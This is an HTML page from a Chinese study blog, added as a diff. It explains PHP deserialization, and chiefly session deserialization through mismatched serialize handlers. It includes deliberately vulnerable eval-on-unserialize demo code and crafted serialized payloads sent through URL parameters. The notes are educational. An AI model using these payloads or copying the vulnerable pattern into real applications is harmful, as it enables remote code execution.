@@ -1,0 +1,1005 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>WP：知识点 - bug_001</title>
+
+  
+    <meta name="description" content="魔术方法123456789101112__wakeup() &#x2F;&#x2F;使用unserialize时触发__sleep() &#x2F;&#x2F;使用serialize时触发__destruct() &#x2F;&#x2F;对象被销毁时触发__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发__get() &#x2F;&#x2F;用于从不可访问的属性读取数据__set() &#x2F;&#x2F;用于将">
+<meta property="og:type" content="website">
+<meta property="og:title" content="知识点">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/php/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+<meta property="og:site_name" content="bug_001">
+<meta property="og:description" content="魔术方法123456789101112__wakeup() &#x2F;&#x2F;使用unserialize时触发__sleep() &#x2F;&#x2F;使用serialize时触发__destruct() &#x2F;&#x2F;对象被销毁时触发__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发__get() &#x2F;&#x2F;用于从不可访问的属性读取数据__set() &#x2F;&#x2F;用于将">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
+<meta property="article:published_time" content="2025-12-23T13:01:43.172Z">
+<meta property="article:modified_time" content="2025-12-23T13:01:43.172Z">
+<meta property="article:author" content="bug_001">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cbbzx12.github.io/images/head.jpg">
+  
+  
+  
+  <meta name="keywords" content="">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/php/%E7%9F%A5%E8%AF%86%E7%82%B9/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"知识点","description":"魔术方法123456789101112__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //...","url":"https://cbbzx12.github.io/wiki/WP/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/php/%E7%9F%A5%E8%AF%86%E7%82%B9/"}</script>
+  
+<!-- hexo injector head_end start -->
+<style>
+  :root { 
+    --card: rgba(255, 255, 255, 0.65) !important; /* Restored to 18:00: Higher Opacity */
+    --block: rgba(255, 255, 255, 0.4) !important;
+    --bg-card: rgba(255, 255, 255, 0.65) !important;
+    --text-p1: #000 !important; 
+    --text-p2: #222 !important;
+    --text-p3: #444 !important;
+  }
+
+  /* Global Background with Blur */
+  body {
+    background: none !important;
+  }
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: url('/images/bg.jpg') no-repeat center center;
+    background-size: 100% 100%;
+    z-index: -1;
+  }
+
+  /* Transparent Layout Containers */
+  .l_main { background: transparent !important; }
+  .l_left { background: transparent !important; border: none !important; box-shadow: none !important; backdrop-filter: none !important; padding: 0 !important; } 
+  .l_body { background: transparent !important; }
+  
+  /* Premium Glassmorphism for Widgets (Global - restores individual card look) */
+  .widget-wrapper, .post-list .post-card, .md-text { 
+    background: var(--card) !important; 
+    backdrop-filter: blur(12px) !important; 
+    -webkit-backdrop-filter: blur(12px) !important;
+    border: 1px solid rgba(255, 255, 255, 0.3) !important; 
+    box-shadow: 0 4px 16px 0 rgba(0, 0, 0, 0.08) !important; 
+    border-radius: 16px !important; 
+  }
+
+  /* FORCE HIDE: Specific fix to remove the "Welcome" widget internal cover image via CSS */
+  .widget-wrapper .widget-header, 
+  .layout-author .cover,
+  .widget-wrapper div[style*="background-image"], /* Catch inline styles */
+  .widget-wrapper .cover {
+    background: transparent !important;
+    background-image: none !important;
+    height: auto !important; /* Reset height if it was set for the image */
+    min-height: 0 !important;
+  }
+
+  /* Site Info Widget Specific Tweaks */
+  .widget-wrapper.markdown {
+      padding: 1rem;
+  }
+</style>
+<!-- hexo injector head_end end --></head>
+<body><div class="sitebg"><div class="siteblur"></div></div>
+
+
+
+<div class="l_body content" id="start" layout="page" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(url(/images/bg.jpg));"></div><img no-lazy class="avatar" src="/images/head.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">bug_001</div><div class="sub cap">记录一些学习过程</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><img no-lazy src="https://api.iconify.design/solar/home-2-bold-duotone.svg?color=%231BCDFC" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item active" title="文档" href="/wiki/" style="color:#3DC550"><img no-lazy src="https://api.iconify.design/solar/notebook-bookmark-bold-duotone.svg?color=%233DC550" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><img no-lazy src="https://api.iconify.design/solar/planet-bold-duotone.svg?color=%23FA6400" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><img no-lazy src="https://api.iconify.design/solar/users-group-two-rounded-bold-duotone.svg?color=%23F44336" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/WP/" placeholder="在 /wiki/WP/ 中搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+
+  <span class="sep"></span>
+  <a class="cap breadcrumb" href="/wiki/WP/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/php/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
+  </div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T13:01:43.172Z">2025-12-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>知识点</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h3><h4 id="WAKEUP"><a href="#WAKEUP" class="headerlink" title="__WAKEUP"></a>__WAKEUP</h4><p>将在序列化之后立即被调用,当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</p>
+<h4 id="DESTRUCT"><a href="#DESTRUCT" class="headerlink" title="__DESTRUCT"></a>__DESTRUCT</h4><h1 id="PHP中SESSION反序列化（重点）"><a href="#PHP中SESSION反序列化（重点）" class="headerlink" title="PHP中SESSION反序列化（重点）"></a>PHP中SESSION反序列化（重点）</h1><h2 id="简介与基础知识"><a href="#简介与基础知识" class="headerlink" title="简介与基础知识"></a>简介与基础知识</h2><p>在php.ini中存在三项配置项：</p>
+<ul>
+<li><code>session.save_path=&quot;&quot;</code> –设置session的存储路径</li>
+<li><code>session.save_handler=&quot;&quot;</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
+<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
+<li><code>session.serialize_handler string</code> –<strong>定义用来序列化&#x2F;反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
+</ul>
+<p>以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。</p>
+<p>在使用<strong>xampp</strong>组件安装中，上述的配置项的设置如下：</p>
+<ul>
+<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
+<li><code>session.save_handler=files</code> 表明session是以文件的方式来进行存储的</li>
+<li><code>session.auto_start=0</code> 表明默认不启动session</li>
+<li><code>session.serialize_handler=php</code> <strong>表明session的默认序列化引擎使用的是php序列话引擎</strong></li>
+</ul>
+<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">引擎</th>
+<th align="left">session存储方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php(php&lt;5.5.4)</td>
+<td align="left">存储方式是，键名+竖线&#96;</td>
+</tr>
+<tr>
+<td align="left">php_serialize(php&gt;5.5.4)</td>
+<td align="left">存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
+</tr>
+<tr>
+<td align="left">php_binary</td>
+<td align="left">存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎名&#39;);</code>进行设置。</p>
+<p>示例代码如下：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);   <span class="comment">//设置序列化引擎使用php_serialize</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p><strong>存储机制</strong></p>
+<p>**php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>**<strong>存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。</strong><br>假设我们的环境是xampp，那么默认配置如上所述。</p>
+<p><strong>在默认配置情况下（在php引擎下：）：</strong></p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()      <span class="comment">// session_start()会创建新会话或者重用现有会话</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，所以在xampp&#x2F;tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是<code>name|s:6:&quot;spoock&quot;;</code> 。name是键值，<code>s:6:&quot;spoock&quot;;</code>是<code>serialize(&quot;spoock&quot;)</code>的结果（php引擎方式存储：键名+竖线 |+经过serialize()函数序列处理的值）。</p>
+<p><strong>在php_serialize引擎下：</strong></p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);   <span class="comment">// 设置序列化引擎使用php_serialize</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();       <span class="comment">// 启动新会话或者重用现有会话 </span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SESSION文件的内容是<code>a:1:{s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;}</code> 。a:1是使用php_serialize进行序列话都会加上。同时<strong>使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
+<p><strong>在php_binary引擎下：</strong><br>存储方式是，键名的长度<strong>对应的ASCII字符</strong>+键名+经过serialize()函数序列化处理的值</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code> 。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
+<h2 id="SESSION序列化漏洞利用"><a href="#SESSION序列化漏洞利用" class="headerlink" title="SESSION序列化漏洞利用"></a>SESSION序列化漏洞利用</h2><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syclover</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$func</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;     <span class="comment">// __construct()在实例化是被调用</span></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;func = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}</code> 。<br>那么反序列化得到的内容是：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(syclover)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;func&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span> (length=<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
+
+<p>**最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。**这就是一个简单的序列化的漏洞的演示</p>
+<h4 id="PHP-SESSION中的序列化危害"><a href="#PHP-SESSION中的序列化危害" class="headerlink" title="PHP SESSION中的序列化危害"></a>PHP SESSION中的序列化危害</h4><p>PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。<br>**如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。**通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;spoock&#x27;</span>] = <span class="string">&#x27;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code> 。</p>
+<p>但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line"> <span class="string">&#x27;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#x27;</span> =&gt; </span><br><span class="line"> <span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;__PHP_Incomplete_Class_Name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;PeopleClass&#x27;</span> (length=<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
+<p><strong>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</strong></p>
+<h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p><strong>存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。</strong></p>
+<p>s1.php，使用php_serialize来处理session</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;spoock&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>us2.php，使用php来处理session</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);`localhost/s1.php?a=|O:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;echo &quot;</span>spoock<span class="string">&quot;;&quot;</span>;&#125;`</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;hi = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;hi);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>，选择session序列化处理器。</p>
+<p>当访问s1.php时，提交如下的数据并存储到session文件中：</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost/s1.php?a=|O:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;echo &quot;</span>spoock<span class="string">&quot;;&quot;</span>;&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。</p>
+<p>O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |<br>就行了</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hi</span>=<span class="string">&#x27;xxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lemon</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">xxxxx处按照你想执行的代码来填写，这里填的是<span class="keyword">echo</span> <span class="string">&quot;spoock</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</strong></p>
+</article>
+<div class="article-footer">
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">bug_001</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
